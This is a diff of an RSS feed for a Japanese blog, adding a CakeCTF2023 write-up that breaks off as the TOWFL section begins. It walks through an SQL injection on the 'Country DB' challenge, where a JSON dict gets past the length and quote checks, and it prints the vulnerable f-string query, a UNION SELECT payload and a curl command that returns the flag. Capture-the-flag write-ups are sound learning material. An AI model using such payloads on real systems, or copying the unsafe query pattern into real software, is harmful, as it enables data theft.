@@ -1,4 +1,1612 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on やじるしのブログ</title><link>https://hiro-1219.github.io/blog/post/</link><description>Recent content in Posts on やじるしのブログ</description><generator>Hugo -- gohugo.io</generator><language>ja</language><lastBuildDate>Sat, 06 May 2023 18:00:00 +0900</lastBuildDate><atom:link href="https://hiro-1219.github.io/blog/post/index.xml" rel="self" type="application/rss+xml"/><item><title>WaniCTF2023 WriteUp</title><link>https://hiro-1219.github.io/blog/p/wanictf2023-writeup/</link><pubDate>Sat, 06 May 2023 18:00:00 +0900</pubDate><guid>https://hiro-1219.github.io/blog/p/wanictf2023-writeup/</guid><description>&lt;h2 id="はじめに">はじめに&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on やじるしのブログ</title><link>https://hiro-1219.github.io/blog/post/</link><description>Recent content in Posts on やじるしのブログ</description><generator>Hugo -- gohugo.io</generator><language>ja</language><lastBuildDate>Mon, 13 Nov 2023 00:00:00 +0900</lastBuildDate><atom:link href="https://hiro-1219.github.io/blog/post/index.xml" rel="self" type="application/rss+xml"/><item><title>CakeCTF2023 WriteUp</title><link>https://hiro-1219.github.io/blog/p/cakectf2023-writeup/</link><pubDate>Mon, 13 Nov 2023 00:00:00 +0900</pubDate><guid>https://hiro-1219.github.io/blog/p/cakectf2023-writeup/</guid><description>&lt;h3 id="はじめに">はじめに&lt;/h3>
+&lt;p>今回、チーム「🍣」のメンバーとして11/11から11/12まで開催されていたCakeCTF2023に参加しました。
+記録として、ここにWriteUp（と期間中に解けなかった問題）を残します。&lt;/p>
+&lt;h2 id="web">web&lt;/h2>
+&lt;h3 id="country-db-web-warmup">Country DB [web, warmup]&lt;/h3>
+&lt;p>問題サイトにアクセスしてみます。
+二文字の国名コードを入力すると、その国がどこなのか調べてくれるサイトのようです。
+このサイトを構築しているソースファイル群は以下のようになっています。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">.
+├── app.py
+├── docker-compose.yml
+├── Dockerfile
+├── init_db.py
+├── templates
+│ └── index.html
+└── uwsgi.ini
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>app.py&lt;/code>を見てみます。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="ch">#!/usr/bin/env python3&lt;/span>
+&lt;span class="kn">import&lt;/span> &lt;span class="nn">flask&lt;/span>
+&lt;span class="kn">import&lt;/span> &lt;span class="nn">sqlite3&lt;/span>
+&lt;span class="n">app&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Flask&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">db_search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="k">with&lt;/span> &lt;span class="n">sqlite3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">connect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;database.db&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">conn&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">cur&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cursor&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;span class="n">cur&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">execute&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;SELECT name FROM country WHERE code=UPPER(&amp;#39;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#39;)&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># SQL injection&lt;/span>
+&lt;span class="n">found&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cur&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fetchone&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="kc">None&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="n">found&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="kc">None&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="n">found&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="nd">@app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">index&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;index.html&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="nd">@app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/api/search&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">methods&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">api_search&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;span class="n">req&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_json&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="s1">&amp;#39;code&amp;#39;&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">req&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">abort&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">400&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;Empty country code&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">code&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">req&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;code&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="s2">&amp;#34;&amp;#39;&amp;#34;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">code&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="c1"># objectをうまいこと使えばできるのでは&lt;/span>
+&lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">abort&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">400&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;Invalid country code&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">db_search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">name&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="kc">None&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">abort&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">404&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;No such country&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>国名コード&lt;code>code&lt;/code>から国名を探すエンドポイントは&lt;code>POST /api/search&lt;/code>のようです。
+ここで、呼び出されている&lt;code>db_search&lt;/code>にはSQLによるデータベースの問い合わせの部分にSQL injectionができる箇所があることが分かります。(コメントで記した部分)&lt;/p>
+&lt;p>&lt;code>init_db.py&lt;/code>も確認します。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sqlite3&lt;/span>
+&lt;span class="kn">import&lt;/span> &lt;span class="nn">os&lt;/span>
+&lt;span class="n">FLAG&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getenv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;FLAG&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;FakeCTF{*** REDACTED ***}&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">conn&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sqlite3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">connect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;database.db&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">execute&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;CREATE TABLE country (
+&lt;/span>&lt;span class="s2"> code TEXT NOT NULL,
+&lt;/span>&lt;span class="s2"> name TEXT NOT NULL
+&lt;/span>&lt;span class="s2">);&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">execute&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;CREATE TABLE flag (
+&lt;/span>&lt;span class="s2"> flag TEXT NOT NULL
+&lt;/span>&lt;span class="s2">);&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">execute&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;INSERT INTO flag VALUES (?)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">FLAG&lt;/span>&lt;span class="p">,))&lt;/span>
+&lt;span class="c1"># Country list from https://gist.github.com/vxnick/380904&lt;/span>
+&lt;span class="n">countries&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;AF&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;Afghanistan&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;AX&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;Aland Islands&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;AL&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;Albania&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;DZ&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;Algeria&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;AS&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;American Samoa&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="o">...&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;WF&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;Wallis And Futuna&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;EH&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;Western Sahara&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;YE&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;Yemen&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;ZM&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;Zambia&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;ZW&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;Zimbabwe&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;span class="p">]&lt;/span>
+&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">executemany&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;INSERT INTO country VALUES (?, ?)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">countries&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">commit&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">close&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>データベースにはcountryデータベースのほかに、flagデータベースがあります。
+ここに問い合わせてflagカラムを表示するようなSQL文を作るようなSQL injectionが行えればよいです。
+しかし、これを行うための問題点がいくつかあります。&lt;/p>
+&lt;ol>
+&lt;li>ブラウザからフォームを使用して&lt;code>code&lt;/code>を送信する場合、2文字までしか入力できない(&lt;code>./template/index.html&lt;/code>参照)&lt;/li>
+&lt;li>POSTにより受け取った&lt;code>code&lt;/code>の長さが2文字もしくは&lt;code>&amp;quot;'&amp;quot;&lt;/code>を含んではいけない(&lt;code>app.py&lt;/code> 24~26行目)&lt;/li>
+&lt;/ol>
+&lt;p>問題点1はcurlなどを用いて外部から&lt;code>/api/search&lt;/code>へPOSTリクエストを送ることで解決できます。
+問題点2を解決するために、pythonのformat stringの特性を利用します。
+pythonのリストや辞書などのオブジェクトをformat stringを用いて文字列に埋め込むと、次のようにリストや辞書の中身が展開された状態で文字列に埋め込まれます。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">code&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;a&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;b&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;code = &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">code&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>また、pythonの&lt;code>len()&lt;/code>メソッドはリスト、辞書の長さを求めるため、どれだけ長い文字列を入力したとしても、&lt;code>code&lt;/code>の長さを自分で調節することが可能になります。（上の場合、キーの文字列の長さをどれだけ長くしたとしても、&lt;code>len(a)&lt;/code>は2のままです）
+この特性をうまく使って次のようなSQL文を作りたいです。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">country&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">UPPER&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;...&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">UNION&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">flag&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">flag&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">--
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>そこで、&lt;code>/api/search&lt;/code>に次のデータをPOSTします。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-json" data-lang="json">&lt;span class="p">{&lt;/span>&lt;span class="nt">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nt">&amp;#34;&amp;#39;)UNION SELECT flag FROM flag; --&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nt">&amp;#34;a&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">}}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>試しにpythonで動かしてみると、次のようになるため、サーバー上ではflagについても問い合わせるようなSQL文として解釈されるはずです。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">code&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;&amp;#39;)UNION SELECT flag FROM flag; --&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;a&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;SELECT name FROM country WHERE code=UPPER(&amp;#39;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#39;)&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">SELECT&lt;/span> &lt;span class="n">name&lt;/span> &lt;span class="n">FROM&lt;/span> &lt;span class="n">country&lt;/span> &lt;span class="n">WHERE&lt;/span> &lt;span class="n">code&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">UPPER&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;{&amp;#34;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">UNION&lt;/span> &lt;span class="n">SELECT&lt;/span> &lt;span class="n">flag&lt;/span> &lt;span class="n">FROM&lt;/span> &lt;span class="n">flag&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="s2">&amp;#34;: 10, &amp;#39;a&amp;#39;: 20}&amp;#39;)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>これをcurlで&lt;code>/api/search&lt;/code>にPOSTするとflagが得られました。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">vagrant@vagrant:~/repo/cakectf2023/web/towfl/service$ curl -X POST -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#34;{\&amp;#34;code\&amp;#34;: {\&amp;#34;&amp;#39;)UNION SELECT flag FROM flag; --\&amp;#34;: 10, \&amp;#34;a\&amp;#34;: 20}}&amp;#34; http://countrydb.2023.cakectf.com:8020/api/search
+{&amp;#34;name&amp;#34;:&amp;#34;CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut}&amp;#34;}
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>よってflagは&lt;code>CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut}&lt;/code>です。&lt;/p>
+&lt;h3 id="towfl-cheat-web">TOWFL [cheat, web]&lt;/h3>
+&lt;p>開催期間中に解けなかった問題です。&lt;/p>
+&lt;p>問題サイトにアクセスしStart Examを押すと、狼語(？)のまるでTOEFL(もしくはTOEIC)かのような4択問題が10*10問出題されます。これで100点（1問1点）が取れればflagが得られるようです。
+サイトを構築しているソースファイル群は以下のようになっています。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
